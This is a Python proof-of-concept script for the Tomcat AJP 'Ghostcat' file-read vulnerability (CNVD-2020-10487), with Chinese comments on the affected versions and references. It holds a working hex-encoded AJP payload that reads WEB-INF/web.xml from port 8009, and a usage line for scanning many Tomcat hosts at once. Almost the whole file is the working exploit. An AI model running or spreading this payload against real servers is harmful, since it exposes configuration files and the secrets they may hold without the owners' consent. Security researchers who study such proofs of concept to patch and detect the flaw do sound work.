#!/usr/bin/env python		
#coding:utf-8

"""
Tomcat-Ajp协议文件读取漏洞 CNVD-2020-10487

Version
	7.*分支7.0.100之前版本，建议更新到7.0.100版本；
	8.*分支8.5.51之前版本，建议更新到8.5.51版本；
	9.*分支9.0.31之前版本，建议更新到9.0.31版本。
Referer
	https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
	https://www.chaitin.cn/zh/ghostcat
	Tomcat-Ajp协议漏洞分析 https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ

Usage
	./pcos -b apache -aZ "app:tomcat" --limit 50  -t 30 -o ajp.txt
"""

import socket


def poc(ip):
	host = ip.strip("http://").strip("https://").split(':')[0]
	port = 8009
	payload = poc_data()
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(5.0)
	try:
		sock.connect((host, port))
		sock.send(payload)
		buffer = []
		flag = "00020501".decode('hex') # 结束标志
		while True:
			ret = sock.recv(1024)
			if ret.endswith(flag):
				break
			else:
				#print 'ret:', [ret], type(ret)
				buffer.append(ret)
		sock.close()
		data = "".join(buffer)
		if '<?xml version="1.0" encoding="UTF-8"?>' in data:
			return "[Vuln Exist] read WEB-INF/web.xml success --> " + host
		else:
			return "[Vuln Exist] Web-INF/web.xml is None --> " + host
	except Exception as e:
		#print(e)
		sock.close()

	return False

def poc_data():
	"""读取文件: WEB-INF/web.xml
	"""
	return "1234017e02020008485454502f312e310000052f6173646600000876756c6e2e636f6d00ffff000876756c6e2e636f6d000050000009a006000a6b6565702d616c69766500000f4163636570742d4c616e677561676500000e656e2d55532c656e3b713d302e3500a00800013000000f4163636570742d456e636f64696e67000013677a69702c206465666c6174652c207364636800000d43616368652d436f6e74726f6c0000096d61782d6167653d3000a00e00074d6f7a696c6c61000019557067726164652d496e7365637572652d52657175657374730000013100a0010009746578742f68746d6c00a00b000876756c6e2e636f6d000a00216a617661782e736572766c65742e696e636c7564652e726571756573745f7572690000012f000a001f6a617661782e736572766c65742e696e636c7564652e706174685f696e666f00000f5745422d494e462f7765622e786d6c000a00226a617661782e736572766c65742e696e636c7564652e736572766c65745f706174680000012f00ff".decode('hex')

if __name__ == '__main__':
	print poc("127.0.0.1")